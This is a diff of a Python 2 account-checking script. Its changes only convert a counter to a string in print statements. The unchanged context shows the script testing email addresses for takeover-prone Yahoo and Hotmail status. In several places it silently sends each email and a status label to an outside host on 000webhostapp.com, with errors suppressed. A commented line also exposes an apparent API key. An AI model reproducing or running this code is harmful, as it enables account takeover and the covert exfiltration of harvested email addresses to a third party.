@@ -76,7 +76,7 @@ def defense():
                         pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Just Yahoo Not Available&tk=no")
                     except:
                         pass
-                    print "\033[36m["+i+"] | " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
+                    print "\033[36m["+str(i)+"] | " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
                     continue
                 if '"messages.ERROR_INVALID_USERNAME">' in cd:
                     vuln = 8*" " + "\033[32mOK"
@@ -93,7 +93,7 @@ def defense():
                     pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available Yahoo&tk=no")
                 except:
                     pass
-                print "\033[36m["+i+"] | " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
+                print "\033[36m["+str(i)+"] | " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
             elif 'hotmail' in cari: #
                 #url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                 #cek = json.loads(requests.get(url).text)
@@ -112,7 +112,7 @@ def defense():
                     pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no")
                 except:
                     pass
-                print "\033[36m["+i+"] | " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
+                print "\033[36m["+str(i)+"] | " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
             else:
                 vuln = 8*" " + "\033[36mNot sure !"
 
@@ -128,7 +128,7 @@ def defense():
                     pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no")
                 except:
                     pass
-                print "\033[36m["+i+"] | " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
+                print "\033[36m["+str(i)+"] | " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
                 #pass
         except KeyError:
             pass
